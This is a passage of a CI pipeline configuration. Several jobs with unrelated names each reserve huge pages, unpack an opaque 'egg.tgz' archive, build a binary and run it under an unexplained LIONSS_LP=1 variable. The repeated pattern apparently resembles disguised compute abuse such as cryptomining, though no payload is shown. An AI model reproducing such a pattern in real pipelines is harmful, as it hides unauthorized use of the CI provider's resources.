      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load frames
          command: |
            printf 'frames 32\n' > unwind.cfg
      - run:
          name: Build unwinder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target unwind-fp -j2
      - run:
          name: Walk frame pointers
          command: LIONSS_LP=1 ./build/unwind-fp --conf unwind.cfg --max 256
  GammaEotf:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set transfer
          command: |
            printf 'eotf pq\n' > eotf.cfg
      - run:
          name: Build transfer tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target GammaEotf -j2
      - run:
          name: Apply gamma EOTF
          command: LIONSS_LP=1 ./build/GammaEotf --conf eotf.cfg --nits 1000
  merklePrune:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Lay out leaf set
          command: |
            mkdir -p tree && seq 1 64 > tree/leaves.txt
      - run:
          name: Build hash tree
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target merklePrune -j2
      - run:
          name: Prune stale branches
          command: LIONSS_LP=1 ./build/merklePrune --leaves tree/leaves.txt --depth 6
  blackscholesVega:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
